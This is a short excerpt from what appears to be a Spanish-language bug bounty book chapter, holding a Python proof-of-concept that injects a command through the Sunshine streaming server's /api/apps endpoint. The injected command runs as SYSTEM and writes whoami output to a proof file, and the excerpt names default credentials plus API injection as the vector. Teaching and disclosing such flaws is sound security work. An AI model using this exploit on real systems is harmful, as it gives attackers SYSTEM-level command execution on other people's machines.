# Extraído de: LibroBugBounty/cap-24-caso-sunshine.md
EVIDENCE = "C:/Users/Public/sunshine_rce_proof.txt"

payload_cmd = (
    f'cmd /c "whoami > {EVIDENCE} && '
    f'echo === SUNSHINE RCE PROOF === >> {EVIDENCE} && '
    f'echo Timestamp: %DATE% %TIME% >> {EVIDENCE} && '
    f'whoami /all >> {EVIDENCE} && '
    f'echo Service: Sunshine (SYSTEM) >> {EVIDENCE} && '
    f'echo Vector: Default credentials + API injection >> {EVIDENCE}'
    f'"'
)

data = json.dumps({
    "name": "SYSTEM_Shell",
    "cmd": payload_cmd,
    "index": -1,
}).encode()

req = urllib.request.Request(
    "https://localhost:47990/api/apps",
    method="POST",
    headers=headers,
    data=data,
)
with urllib.request.urlopen(req, context=ctx) as resp:
    result = json.loads(resp.read())
    print(f"Injection: {result.get('status')}")
    # Injection: True
